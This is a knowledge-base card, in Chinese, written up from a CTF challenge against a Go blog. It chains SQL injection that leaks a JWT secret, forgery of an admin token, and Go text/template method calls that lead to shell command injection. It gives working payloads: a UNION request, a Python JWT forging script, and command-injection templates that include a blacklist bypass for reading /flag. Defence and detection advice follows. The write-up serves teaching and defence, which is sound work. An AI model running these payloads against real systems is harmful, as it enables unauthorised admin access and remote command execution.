---
id: web-golang-gopherblog-sqli-jwt-template-method-rce
title: Go 博客链：SQLi 读 jwt_secret 伪造 admin JWT，text/template 方法调用 Configure/Ping 命令注入
type: scenario
domain: web
path: web/golang
technique: go-blog-sqli-jwt-template-method-rce
tags:
- go
- sqli
- jwt
- text-template
- ssti
- command-injection
- mailer
- web-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:46:13+08:00'
  notes: 已对照原文第3节核对：searchHandler 调用 sanitizeSearchInput 但丢弃返回值、重新从 Form 取 q 并 fmt.Sprintf 拼 SQL；UNION SELECT 999,key,value,'a','b','c' FROM settings 读出 jwt_secret；validateToken 仅接受 HMAC、getCurrentUser 直接信任 claim、adminRequired 只判 role==admin；Newsletter 预览 text/template 暴露 Mailer，Configure 写 Host、Ping 用 sh -c 拼接 nc 命令；黑名单绕过 payload set -- /f*;IFS= read y < ;echo  与原文一致。未验证点：CTF 环境，路由/密钥随题变化，未复跑；无 CVE/受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/golang/web-golang-gopherblog-sqli-jwt-template-method-rce/
draft: false
kb_aliases:
- gopherblog
- Go text/template 方法调用 RCE
- Mailer.Configure Ping 命令注入
- SQLi 读 jwt_secret 伪造 admin
- sanitize 返回值未使用
---

## 一句话结论

Go 博客的搜索接口虽然调用了 `sanitizeSearchInput` 却丢弃返回值、继续用原始 `q` 拼 SQL；攻击者用 UNION 读出 `settings.jwt_secret`，伪造 `role=admin` 的 HS256 JWT 进入后台，再借 Newsletter 预览的 `text/template` 调用 `Mailer.Configure` 改写 Host、`Mailer.Ping` 把 Host 拼进 `sh -c`，最终命令执行读取 `/flag`。

## 原理

- **SQL 注入**：`searchHandler` 先 `sanitizeSearchInput(q)`，但随后重新从 `r.Form` 取 `q`，用 `fmt.Sprintf("... WHERE title LIKE '%%%s%%' OR content LIKE '%%%s%%' ...", q, q)` 拼接；清洗函数只是“被调用”，结果未参与查询。
- **JWT 密钥泄露**：`settings` 表存 `jwt_secret`；用 `UNION SELECT 999,key,value,'a','b','c' FROM settings --` 把 key/value 伪装成 posts 字段返回，直接读出 HMAC 密钥。
- **JWT 信任边界**：`validateToken` 只接受 HMAC 签名（`alg=none` 不行），但 `getCurrentUser` 直接从 token claim 取 `username`/`role` 构造用户对象，不回查数据库；`adminRequired` 只判断 `CurrentUser.Role == "admin"`。拿到密钥即可签任意 admin token。
- **模板方法调用**：后台 `POST /admin/newsletter` 的 `action=preview` 用 `text/template` 解析并执行用户模板；模板根对象暴露 `Mailer`，Go 模板允许调用导出的无参/有参方法，因此 `{{ .Mailer.Configure "host" 25 }}{{ .Mailer.Ping }}` 可依次执行。
- **命令注入**：`MailService.Configure` 把用户参数写入 `Mailer.Host`/`Port`；`Ping` 用 `fmt.Sprintf("echo QUIT | nc -w3 %s %d 2>&1 || echo 'Connection to %s:%d failed'", host, port, host, port)` 拼接后 `os/exec.Command("sh", "-c", cmd)`。`host` 直接进入 shell 字符串，可用 `;` 注入命令。
- **黑名单绕过**：`checkTemplateContent` 拦截 `cat`、`sed`、`awk`、`dd`、`$(` 等；改用 shell 内建与通配符：`set -- /f*; IFS= read y < $1; echo $y`，不出现被拦关键字即可读文件。

## 触发条件

- 目标为 Go Web 应用，搜索接口把用户输入直接拼进 SQL，且清洗函数返回值被忽略。
- 数据库中存在 `settings` 表与 `jwt_secret`，查询结果可回显（UNION/报错/布尔均可）。
- JWT 使用 HMAC 且密钥可从数据库/配置泄露；服务端信任 token 内的 `role`，不回查用户。
- 后台存在模板预览/渲染功能，模板根对象暴露了带危险方法的对象（如 `Mailer`）。
- 模板引擎允许方法调用（Go `text/template` 默认允许导出方法），且黑名单不完整。
- 应用进程有权限读取目标文件/执行命令。

## 利用步骤

1. 探测搜索接口：确认 `q` 进入 SQL，且 `sanitizeSearchInput` 的返回值未生效（可对比特殊字符/布尔差异）。
2. UNION 读 `settings`：`' UNION SELECT 999,key,value,'a','b','c' FROM settings -- `，从返回的 `title/content` 取 `jwt_secret`。
3. 用密钥签 HS256 JWT：header `{"alg":"HS256","typ":"JWT"}`，payload `{"role":"admin","username":"admin","exp":...}`，HMAC-SHA256 后 base64url 拼接。
4. 带 token 访问 `/admin`、`/admin/newsletter`，确认管理员权限。
5. 在 Newsletter 预览提交模板，先验证字段/方法：`{{ .Mailer.Host }}`、`{{ .Mailer.Ping }}`、`{{ .Mailer.Configure "127.0.0.1" 25 }}{{ .Mailer.Ping }}`。
6. 注入命令：`{{ .Mailer.Configure "127.0.0.1 25;id;#" 25 }}{{ .Mailer.Ping }}`，确认回显 `uid=0(root)`。
7. 枚举文件：`...;ls /;#`；绕过黑名单读 `/flag`：`{{ .Mailer.Configure "127.0.0.1 25;set -- /f*;IFS= read y < $1;echo $y;#" 25 }}{{ .Mailer.Ping }}`。

## PoC

```http
GET /api/posts/search?q=%27%20UNION%20SELECT%20999,key,value,%27a%27,%27b%27,%27c%27%20FROM%20settings%20--%20 HTTP/1.1
Host: target
```

```python
import base64, json, hmac, hashlib, time

secret = b"<jwt_secret from settings>"
def b64(x): return base64.urlsafe_b64encode(json.dumps(x, separators=(",", ":")).encode()).rstrip(b"=")
header = {"alg": "HS256", "typ": "JWT"}
payload = {"exp": int(time.time()) + 86400, "iat": int(time.time()), "role": "admin", "username": "admin"}
msg = b".".join([b64(header), b64(payload)])
sig = base64.urlsafe_b64encode(hmac.new(secret, msg, hashlib.sha256).digest()).rstrip(b"=")
print((msg + b"." + sig).decode())
```

```text
POST /admin/newsletter  action=preview
template={{ .Mailer.Configure "127.0.0.1 25;id;#" 25 }}{{ .Mailer.Ping }}

# 读 /flag（黑名单绕过）
template={{ .Mailer.Configure "127.0.0.1 25;set -- /f*;IFS= read y < $1;echo $y;#" 25 }}{{ .Mailer.Ping }}
```

无真实目标 PoC：原文为 CTF 环境，字段名/路由/密钥需按目标调整；核心是 SQLi→JWT→模板方法→命令注入。

## 变体与关联

- **SQLi 变体**：UNION、报错、布尔、时间盲注；`settings` 表也可换成环境变量/配置文件/其他密钥表。
- **JWT 变体**：HS256 密钥泄露、alg 混淆、kid 注入、claim 信任（role/is_admin）、无签名校验。
- **模板变体**：Go `text/template`/`html/template`、Java FreeMarker/Velocity、Python Jinja2、Node EJS；只要模板可调用对象方法且对象含危险方法，就可能形成 SSTI/RCE。
- **命令注入变体**：`Configure` 类“先写状态再触发”的两步链；`strings.Fields`/`sh -c`/`exec.Command` 参数拼接；黑名单绕过用 shell 内建、通配符、变量拼接、编码。
- **关联**：Go text/template 方法调用、JWT claim 信任、SQLi 读配置、命令注入黑名单绕过。

## 检测与防御

- **SQL**：使用参数化查询；清洗函数的返回值必须参与查询；对 `LIKE` 通配符做转义；限制数据库账号权限，敏感配置表不可被业务查询读取。
- **JWT**：密钥高熵并定期轮换；服务端从数据库/权威源加载用户与角色，不信任 token 内的 `role`；校验 `alg` 白名单、`exp`/`iat`/`aud`/`iss`；敏感操作二次鉴权。
- **模板**：不要把含危险方法的对象暴露给用户模板；使用受限模板/沙箱，禁用方法调用或只允许白名单方法；模板预览与正式发送分离，预览不执行副作用方法。
- **命令执行**：不要用 `sh -c` 拼接用户输入；`exec.Command` 使用固定参数与 allowlist；对 Host/Port 做格式校验；禁用 `nc` 等不必要的工具。
- **检测**：监控搜索接口的 UNION/注释/异常长参数；监控 JWT 中 `role` 突变与同一密钥多账号；监控模板中出现 `.Configure`/`.Ping`/方法调用链；对 `sh -c` 子进程与 `nc` 外联告警。

## 可信度与边界

- 原文为 CTF Web 题，SQLi 读密钥、JWT 伪造、模板方法调用与命令执行均有请求/回显证据；攻击链完整。
- 具体路由、字段名、密钥与模板对象为该题实现；真实目标需按代码审计结果调整。
- 未在真实目标复跑；卡内不包含题目 flag。
